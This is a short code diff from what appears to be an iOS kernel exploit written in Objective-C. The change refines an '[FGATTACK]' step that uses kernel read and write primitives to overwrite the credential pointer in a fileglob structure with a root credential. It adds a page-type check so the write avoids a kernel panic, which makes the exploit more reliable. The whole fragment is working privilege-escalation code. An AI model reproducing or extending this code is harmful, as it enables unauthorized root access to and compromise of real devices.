@@ -2503,7 +2503,12 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                         kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fg_cred offset=%@",
                                   fgOff != 0xFFFFFFFF ? [NSString stringWithFormat:@"+%#x ★", fgOff] : @"not found"]);
                     }
-                    if (fgOff != 0xFFFFFFFF) {
+                    uint64_t globPA = kpLooksLikeKernelPointer(glob) ? kvtophys(glob & ~0x3fffULL) : 0;
+                    int globT = globPA ? kpFrameTypeOf(globPA) : -1;
+                    kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fileglob pagePA=%#llx type=%d — kwrite %@",
+                              (unsigned long long)globPA, globT,
+                              globT == 0x21 ? @"allowed (0x21)" : @"BLOCKED (not 0x21 - skipped, no panic)"]);
+                    if (fgOff != 0xFFFFFFFF && globT == 0x21) {
                         uint64_t old = early_kread64(glob + fgOff);
                         early_kwrite64(glob + fgOff, rootZVA);
                         uint64_t rb = early_kread64(glob + fgOff);
